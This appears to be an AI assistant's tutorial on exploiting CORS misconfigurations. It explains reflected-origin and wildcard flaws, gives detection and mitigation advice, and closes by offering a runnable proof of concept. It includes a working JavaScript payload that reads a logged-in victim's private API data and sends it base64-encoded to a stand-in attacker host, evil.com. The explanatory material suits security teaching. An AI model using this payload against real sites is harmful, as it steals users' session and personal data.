Here's a detailed **CORS Misconfiguration Exploit Pipeline** when the server uses a **wildcard (`*`) origin** or **reflects the `Origin` header** insecurely.

---

## 🌐 **CORS Basics**

Cross-Origin Resource Sharing (CORS) is a browser security feature that controls how resources on one origin can be accessed by scripts on another.

If misconfigured, it allows **any origin** to read sensitive data (like user credentials, API responses) or perform authenticated actions.

---

## 🚩 **Types of Misconfigurations**

1. `Access-Control-Allow-Origin: *` with sensitive data
2. Reflecting `Origin` without validation
3. `Access-Control-Allow-Credentials: true` with wildcard `*` (which is **invalid**, but if bypassed, critical)
4. Whitelist matching by **string contains** (e.g., `example.com` also allows `evil-example.com`)
5. Misconfigured wildcard subdomains (`*.domain.com` includes `attacker.domain.com`)
6. CORS allowed on **sensitive endpoints** like `/api/user`, `/session`, `/admin`

---

## 🧪 Exploit Pipeline: **Wildcard or Reflective CORS**

### 🎯 Goal:

Steal sensitive data from an authenticated user (like session info, personal data, or tokens) by making the browser send authenticated requests **from the attacker's site**.

---

### 🧷 Step-by-Step Exploit (Reflective Origin)

#### ✅ Target endpoint is vulnerable:

```http
Access-Control-Allow-Origin: <whatever-origin-was-sent>
Access-Control-Allow-Credentials: true
```

---

### 💣 Exploit Steps

#### 🧑‍💻 1. Attacker hosts this malicious script on `evil.com`:

```html
<script>
fetch("https://vulnerable.com/api/userinfo", {
  credentials: "include" // sends session cookie
})
.then(res => res.text())
.then(data => {
  fetch("https://evil.com/log?data=" + btoa(data)); // sends to attacker's server
});
</script>
```

#### 📨 2. Victim visits `evil.com` (while logged into `vulnerable.com`).

#### 🔐 3. Browser sends authenticated request with cookies to `https://vulnerable.com/api/userinfo`.

#### 🎯 4. Since the origin is reflected, the server replies with:

```http
Access-Control-Allow-Origin: evil.com
Access-Control-Allow-Credentials: true
```

✅ So the victim's browser **allows the JavaScript to read** the private response.

#### 📤 5. Data is exfiltrated to the attacker.

---

## 🔎 Detection

1. Test endpoints with a custom Origin (e.g., `Origin: evil.com`)
2. Check `Access-Control-Allow-Origin` in the response:
    - Is it reflected?
    - Is it `*` and sending credentials?

---

## 🛡️ Mitigation

- Do **not** use `Access-Control-Allow-Origin: *` on endpoints serving sensitive data.
- Avoid reflecting `Origin` unless validated against a strict whitelist.
- **Never** use `Access-Control-Allow-Credentials: true` with wildcard origins.
- Use allowlists that **strictly match** origin strings, not substrings.

---

Would you like a PoC you can run in a Node.js or Flask app to demonstrate this misconfiguration?